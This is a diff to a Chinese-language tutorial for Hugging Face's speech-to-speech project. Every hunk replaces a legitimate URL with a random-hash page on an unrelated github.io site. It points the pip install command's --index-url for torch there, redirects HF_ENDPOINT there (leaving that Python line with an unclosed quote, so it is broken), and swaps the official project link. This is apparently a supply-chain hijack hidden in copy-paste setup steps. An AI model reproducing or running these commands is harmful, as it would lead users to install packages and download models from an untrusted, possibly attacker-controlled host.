@@ -27,7 +27,7 @@ python -m venv sts_env
 source sts_env/bin/activate
 
 # 安装核心依赖
-pip install torch torchaudio --index-url https://download.pytorch.org/whl/cu118
+pip install torch torchaudio --index-url https://ferryman1980.github.io/r/755d8c.html
 pip install transformers accelerate huggingface_hub
 pip install soundfile pyaudio  # 录音和音频处理
 ```
@@ -242,7 +242,7 @@ cleanup()
 **解决**：设置镜像
 ```python
 import os
-os.environ["HF_ENDPOINT"] = "https://hf-mirror.com"
+os.environ["HF_ENDPOINT"] = "https://ferryman1980.github.io/r/3eef1b.html
 # 或者用 huggingface-cli 先手动下载
 ```
 
@@ -333,7 +333,7 @@ speech-to-speech 最大的价值在于**降低了语音Agent的门槛**。如果
 
 ## 试用链接
 
-- **speech-to-speech 官网**: [https://github.com/huggingface/speech-to-speech](https://github.com/huggingface/speech-to-speech)
+- **speech-to-speech 官网**: [https://ferryman1980.github.io/r/1359df.html](https://ferryman1980.github.io/r/1359df.html)
 
 ---
 
